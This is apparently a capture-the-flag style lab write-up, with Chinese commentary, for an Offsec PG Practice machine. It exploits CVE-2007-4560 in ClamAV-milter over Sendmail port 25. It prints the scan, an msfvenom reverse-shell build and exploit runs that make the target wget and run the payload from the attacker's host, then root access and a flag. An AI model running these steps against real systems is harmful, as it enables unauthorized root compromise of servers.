###### tags: `Offsec` `PG Practice` `Easy` `Linux`

# ClamAV
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.166.42 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.166.42:22
Open 192.168.166.42:25
Open 192.168.166.42:80
Open 192.168.166.42:139
Open 192.168.166.42:199
Open 192.168.166.42:445
Open 192.168.166.42:60000

PORT      STATE SERVICE     REASON  VERSION
22/tcp    open  ssh         syn-ack OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
25/tcp    open  smtp        syn-ack Sendmail 8.13.4/8.13.4/Debian-3sarge3
|_smtp-ntlm-info: ERROR: Script execution failed (use -d to debug)
| smtp-commands: localhost.localdomain Hello [192.168.45.244], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
80/tcp    open  http        syn-ack Apache httpd 1.3.33 ((Debian GNU/Linux))
139/tcp   open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
199/tcp   open  smux        syn-ack Linux SNMP multiplexer
445/tcp   open  netbios-ssn syn-ack Samba smbd 3.0.14a-Debian (workgroup: WORKGROUP)
60000/tcp open  ssh         syn-ack OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
```

google找到[CVE-2007-4560](https://github.com/0x1sac/ClamAV-Milter-Sendmail-0.91.2-Remote-Code-Execution/blob/main/exploit.c)，下載reverseshell
```
┌──(kali㉿kali)-[~/pgplay]
└─$ gcc clamav.c -o clamav 

┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp9001

┌──(kali㉿kali)-[~/pgplay]
└─$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.244 LPORT=9001 -f elf > shell_9001

┌──(kali㉿kali)-[~/pgplay]
└─$ ./clamav 192.168.166.42 25 "wget 192.168.45.244/shell_9001"                                                   
[+] Connected to 192.168.166.42:25
[+] Payload sent!

┌──(kali㉿kali)-[~/pgplay]
└─$ ./clamav 192.168.166.42 25 "chmod +x shell_9001"
[*] Warning: it is advised to use absolute path for commands
[+] Connected to 192.168.166.42:25                                                                                                          
[+] Payload sent!

┌──(kali㉿kali)-[~/pgplay]
└─$ ./clamav 192.168.166.42 25 "./shell_9001"
[+] Connected to 192.168.166.42:25
[+] Payload sent!
```

等反彈就拿到root權限，進/root得proof.txt
```
whoami
root
cat proof.txt
7fcc26337f81ca0d455b3c604a8d4d27
```
